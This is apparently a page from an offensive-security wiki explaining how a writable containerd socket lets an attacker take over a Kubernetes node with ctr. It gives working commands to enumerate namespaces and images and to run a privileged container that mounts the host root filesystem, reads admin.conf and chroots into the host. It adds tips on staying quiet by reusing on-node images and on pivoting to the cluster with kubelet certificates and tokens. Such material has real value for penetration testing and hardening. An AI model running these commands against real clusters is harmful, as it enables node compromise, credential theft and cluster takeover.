---
title: "containerd socket: node-level container control through ctr"
description: "The containerd control socket is the node's container control plane with no authentication beyond filesystem permissions. A process that can write to it uses ctr to list namespaces and images and to run a new privileged container that bind-mounts the node root filesystem, taking over the Kubernetes node."
keywords:
  - containerd socket
  - ctr
  - kubernetes node
  - privileged container
  - node takeover
---

# containerd socket

`/run/containerd/containerd.sock` is containerd's control API, and like the Docker socket it is gated only by filesystem permissions, not by authentication. Any process that can write to it, whether a workload that was given the socket as a mount or a compromised node-local process, controls containerd and therefore the node: it can run a container that mounts the node root and runs as root. Kubernetes workloads run under the `k8s.io` containerd namespace, which is where the interesting images and containers live.

Confirm access and enumerate:

```bash
S=/run/containerd/containerd.sock
ls -l $S                                            # writable by your UID?
ctr --address $S namespace ls                       # namespaces; k8s.io holds pod containers
ctr --address $S -n k8s.io image ls | head
ctr --address $S -n k8s.io container ls
```

## Node takeover

```bash
# run a privileged container that bind-mounts the node root filesystem
ctr --address $S -n k8s.io run --rm --privileged \
  --mount type=bind,src=/,dst=/host,options=rbind:rw \
  docker.io/library/alpine:latest esc \
  sh -c 'cat /host/etc/kubernetes/admin.conf; chroot /host sh -c id'
# reuse an image already present to avoid a pull
ctr --address $S -n k8s.io image ls | awk 'NR==2{print $1}'
```

The node root mount exposes the kubelet configuration and credentials, static pod manifests, and every secret projected onto the node, which typically escalates from the node to the cluster.

## Exploitation notes

- The socket is unauthenticated; filesystem permission on it inside your context is the only gate, so `ls -l` tells you immediately whether the route is open.
- Target the `k8s.io` namespace for Kubernetes nodes; containers and images there belong to running pods and the node's system components.
- Reuse an on-node image (`image ls`) to avoid pulling and to stay quiet; any Linux image works because you immediately use the host mount. The escape mechanics match [Runtime socket mount](../../container-escape/sensitive-mounts/runtime-socket-mount.md).
- The node root mount is a cluster pivot: read `admin.conf`, kubelet client certs, and projected service-account tokens, then act against the API server.

## References

- [containerd: getting started with ctr](https://github.com/containerd/containerd/blob/main/docs/getting-started.md)
- [HackTricks: containerd (ctr)](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)
